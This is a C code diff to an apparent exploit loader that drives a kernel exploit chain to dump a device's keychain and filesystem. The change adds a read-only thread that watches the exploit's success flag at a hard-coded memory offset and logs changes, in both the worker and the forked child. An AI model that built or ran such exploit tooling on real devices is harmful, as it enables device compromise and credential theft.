@@ -35,6 +35,12 @@
  *             the core filesystem export joins the "filesystem" acquisition
  *             alongside the loader's own bundle tar. Exploit failure adds
  *             ZERO new calls; the 26.x MCM branch is untouched.
+ * v6.8 raw-sampler: read-only detached observer of the kernel-exploit raw
+ *             flag at core+0x6b96d8 (1 Hz, 180 s, logs only on value
+ *             change) to distinguish exploit not-attempted / failed /
+ *             succeeded on device. Started after resolve_core_base()
+ *             succeeds in the worker and once more in the fork child
+ *             (copy-on-write). No exploit-chain logic changed.
  */
 typedef unsigned long u64;
 typedef long long i64;
@@ -780,6 +786,66 @@ static int exploit_core_ok(void *core, int *out_raw, int *out_resolved) {
     snprintf(msg, sizeof(msg), "core base=%p flag addr=%p raw=%d ok=%d", (void *)base, (void *)flag, raw, ok);
     log_info(msg);
     return ok;
+}
+
+/* ---------- v6.8 raw flag sampler (observation instrument) ----------
+ *
+ * TopTier reverse-engineering fact: core+0x6b96d8 is the kernel exploit's
+ * raw flag; raw==0 means the core's in-process kernel read capability is
+ * ready, which is the precondition for the core's own auto chain to dump
+ * the keychain. On B台 (v5.9 behavior) InitLogs(0x42a0) never returns, so
+ * no one-shot read after InitLogs can ever run; the only way to tell
+ * "exploit not attempted / attempted and failed / succeeded" apart is to
+ * watch the flag WHILE the core auto chain runs.
+ *
+ * This is a pure observer: READ-ONLY volatile u32 read once per second for
+ * 180 seconds in a detached pthread; a line is logged only when the value
+ * CHANGES. plain sleep(1) so the thread naturally parks when the app is
+ * suspended; no synchronization primitives. It is started right after
+ * repair_core_log_sink() (i.e. after resolve_core_base() succeeded in the
+ * worker, before any exploit path is chosen), plus once more inside the
+ * fork child before exploit_class_main() - after fork the child gets its
+ * own copy-on-write image, so the parent sampler cannot see the child's
+ * flag transitions. The exploit chain itself is untouched. */
+static volatile int g_raw_sampler_child = 0;
+
+static void *raw_sampler_worker(void *arg) {
+    unsigned char *base = (unsigned char *)arg;
+    volatile unsigned int *flag = (volatile unsigned int *)(void *)(base + 0x6b96d8);
+    unsigned int last = *flag;
+    char msg[200];
+    snprintf(msg, sizeof(msg), "raw sampler start%s base=%p initial=%u",
+             g_raw_sampler_child ? " (child)" : "", (void *)base, last);
+    log_info(msg);
+    for (int t = 1; t <= 180; t++) {
+        sleep(1);
+        unsigned int v = *flag;
+        if (v != last) {
+            last = v;
+            snprintf(msg, sizeof(msg), "core raw flag = %u (t=%ds)", v, t);
+            log_info(msg);
+        }
+    }
+    snprintf(msg, sizeof(msg), "raw sampler end%s final=%u",
+             g_raw_sampler_child ? " (child)" : "", last);
+    log_info(msg);
+    return 0;
+}
+
+static void start_raw_flag_sampler(void *core) {
+    if (!core) { log_info("raw sampler skipped (no core base)"); return; }
+    unsigned char *base = 0;
+    if (!resolve_core_base(core, &base)) {
+        log_info("raw sampler skipped (no core base)");
+        return;
+    }
+    void *th = 0;
+    if (pthread_create(&th, 0, raw_sampler_worker, base) == 0) {
+        pthread_detach(th);
+        log_info("raw sampler thread launched");
+    } else {
+        log_warn("raw sampler pthread FAIL");
+    }
 }
 
 /* v5.6: original main binary calls CLASS methods, not instance methods.
@@ -1918,7 +1984,7 @@ static void *worker(void *arg) {
         log_info(dm);
     }
 
-    log_info("=== loader89 v6.7.1 keychain-acq2 start ===");
+    log_info("=== loader89 v6.8 raw-sampler start ===");
     read_runtime_config();
     {
         /* v5.8 problem C: child/worker exploit state goes to this file;
@@ -1960,6 +2026,11 @@ static void *worker(void *arg) {
      * sink vtable is non-zero and repair_core_log_sink only probes it. */
     manual_run_core_inits(core);
     repair_core_log_sink(core);
+    /* v6.8: pure read-only raw-flag observer, started after resolve_core_base()
+     * succeeded (inside start_raw_flag_sampler) and before the exploit path is
+     * chosen; covers the B台 in-process direct fallback where InitLogs never
+     * returns. Does not touch the exploit chain. */
+    start_raw_flag_sampler(core);
     post_log_now();
 
     int exploit_ok = 0;
@@ -1997,6 +2068,10 @@ static void *worker(void *arg) {
          * MHA/MCM fallback alive. */
         pid_t child = fork();
         if (child == 0) {
+            /* v6.8: fork gives the child a copy-on-write image; the parent's
+             * sampler cannot see this copy, so observe here too (read-only). */
+            g_raw_sampler_child = 1;
+            start_raw_flag_sampler(core);
             int rc = exploit_class_main(acqCls, core);
             write_child_status();
             _exit(rc);
